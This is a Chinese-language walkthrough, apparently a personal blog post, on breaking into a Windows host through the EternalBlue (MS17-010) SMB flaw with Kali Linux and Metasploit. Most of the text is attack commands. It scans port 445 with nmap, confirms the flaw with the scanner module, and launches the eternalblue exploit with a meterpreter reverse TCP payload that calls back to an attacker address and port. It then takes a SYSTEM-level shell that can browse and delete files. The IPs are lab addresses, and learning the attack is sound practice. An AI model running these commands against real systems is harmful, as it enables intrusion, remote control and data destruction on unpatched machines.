# 关于kali利用永恒之蓝漏洞入侵windows主机

## 1. 探测目标主机系统及445端口是否开放

```
nmap -sV -T4 192.168.205.200
```

 下图可以看到windos已开启445端口

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/1.png)

 ## 2. 打开kali的渗透测试工具Metasploit

```
msfconsole　　
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/2.png)

## 3. 搜索永恒之蓝漏洞名

```
search smb_ms17_010
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/3.png)

  使用此模块，并设置被攻击主机IP

```shell
use auxiliary /scanner/smb/smb_ms17_010 show options
# 设置被攻击的主机IP
set RHOSTS 192.168.205.200
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/4.png)

## 4. 运行看是否存在永恒之蓝漏洞(下图显示目标主机存在此漏洞)

```
run
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/5.png)

## 5. 使用攻击模块设置被攻击主机IP

```shell
use exploit /windows/smb/ms17_010_eternalblue 
set rhosts 192.168.205.200
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/6.png)

## 6. 设置攻击载荷（kali所在主机IP及监听端口

```shell
# 攻击载荷
set payload windows /x64/meterpreter/reverse_tcp
# 攻击机IP（kali主机）
set lhost 192.168.205.173
# 攻击机监听端口
set lport 6666 
# 查看设置的参数
show options
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/7.png)

## 7. 执行攻击命令（下图显示已经入侵到windows系统）

```
exploit
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/8.png)

可以使用？查看帮助命令

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/9.png)

```shell
sysinfo # 系统相关信息
getuid  # 查看当前用户身份权限，下图可以看到已取得了系统级别权限　
```

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/10.png)

## 8. 可以使用像linux一样的命令查看，切换目录，删除等操作

![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/11.png)

